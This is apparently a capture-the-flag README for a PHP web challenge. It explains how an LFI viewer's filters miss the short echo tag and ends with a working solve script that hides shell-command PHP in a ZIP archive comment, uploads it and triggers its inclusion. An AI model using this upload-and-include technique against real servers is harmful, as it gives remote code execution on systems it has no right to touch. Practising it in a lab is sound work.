# 🏆 CTF Challenge: The Archivist's Echo (Web/Medium)

## Challenge Description
The application is a restricted archive uploader and viewer. It features a Local File Inclusion (LFI) vulnerability in the viewer (`?file=...`), but it's heavily defended:
1. **Blacklist:** Filters for common wrappers (`php://`, `data://`) and the full PHP open tag (`<?php`).
2. **`open_basedir`:** Restricts file access to `/var/www/html/uploads` and `/tmp`.

The goal is to bypass these restrictions to achieve Remote Code Execution (RCE) and read the flag at `/flag.txt`.

**The Intended Vulnerability:**
The filter **fails to block the PHP short echo tag (`<?=`)**. By uploading a ZIP file whose **archive comment** contains PHP code using `<?= ... ?>`, the RCE payload will execute when the ZIP file is passed to `include()`, as PHP parses the archive comment before the binary junk.

## Setup Instructions

1. **Build the Docker Image:**
   ```bash
   docker build -t the-archivist-echo .

BASE="http://localhost:8080"; TD="$(mktemp -d)"; cd "$TD"; printf x > x.txt && zip -q p.zip x.txt
printf '%s' '<?=`ls -la / /var/www/html 2>&1`?>' | zip -q -z p.zip
resp="$(curl -sS -F 'archiveFile=@p.zip;type=application/zip;filename=p.zip' "$BASE/")"; name="$(sed -n 's/.*<code>\([0-9a-f]\{32\}\.zip\)<\/code>.*/\1/p' <<<"$resp")"
curl -sS "$BASE/?file=uploads/$name" | cat -v

